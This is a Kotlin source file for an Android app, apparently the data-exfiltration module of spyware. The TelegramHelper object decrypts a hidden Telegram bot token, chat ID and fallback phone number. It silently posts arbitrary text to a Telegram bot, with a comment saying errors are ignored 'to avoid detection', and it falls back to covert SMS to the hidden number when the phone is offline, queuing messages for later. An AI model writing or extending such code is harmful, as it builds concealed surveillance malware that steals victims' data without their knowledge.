package com.security.testapp

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.telephony.SmsManager
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

object TelegramHelper {

    // ---------- ENCRYPTED CREDENTIALS ----------
    private const val ENC_BOT_TOKEN = "Ge/yFA9htcB0gLN7qgBSTShPQCNDcMfTv4hVlDLW5y6utkffUbLX8UNNjL6gnTwl"
    private const val IV_BOT = "kvPMgLcXy+yBkdYhSdKqwQ=="
    private const val ENC_CHAT_ID = "bXO+RiHa2rroRpIm4OJkhA=="
    private const val IV_CHAT = "C1BRF7rx7/C10HtDT+Q/+w=="
    private const val ENC_FALLBACK = "77njSez0onC1i+xf6dA+xQ=="
    private const val IV_FALLBACK = "t3lCQ/NLpZoRLrhNN6VPhw=="

    // Decrypted values (lazy to decrypt only once)
    private val BOT_TOKEN: String by lazy { CryptoUtils.decrypt(ENC_BOT_TOKEN, IV_BOT) }
    private val CHAT_ID: String by lazy { CryptoUtils.decrypt(ENC_CHAT_ID, IV_CHAT) }
    private val FALLBACK_NUMBER: String by lazy { CryptoUtils.decrypt(ENC_FALLBACK, IV_FALLBACK) }

    private val dbHelper = DatabaseHelper.instance

    fun sendMessage(text: String) {
        Thread {
            try {
                val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                val data = "chat_id=$CHAT_ID&text=${URLEncoder.encode(text, "UTF-8")}"
                OutputStreamWriter(conn.outputStream).use { it.write(data) }
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {
                // Silently ignore to avoid detection
            }
        }.start()
    }

    fun sendWithFallback(text: String, context: Context) {
        if (isOnline(context)) {
            sendMessage(text)
        } else {
            // Offline: try SMS fallback first
            if (!sendSmsFallback(text)) {
                // SMS failed, store in DB
                dbHelper.insertMessage(text)
            } else {
                // SMS sent but also queue for Telegram when online
                dbHelper.insertMessage(text)
            }
        }
    }

    fun flushQueue(context: Context) {
        if (!isOnline(context)) return
        val messages = dbHelper.allMessages
        for (msg in messages) {
            sendMessage(msg)
            // Delete oldest to avoid re-sending everything on next flush
            if (dbHelper.allMessages.isNotEmpty()) {
                dbHelper.deleteMessage(0)
            }
        }
    }

    private fun sendSmsFallback(text: String): Boolean {
        return try {
            val smsManager = SmsManager.getDefault()
            val parts = smsManager.divideMessage(text)
            smsManager.sendMultipartTextMessage(FALLBACK_NUMBER, null, parts, null, null)
            true
        } catch (_: Exception) {
            false
        }
    }

    private fun isOnline(context: Context): Boolean {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork ?: return false
        val capabilities = cm.getNetworkCapabilities(network) ?: return false
        return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }
}
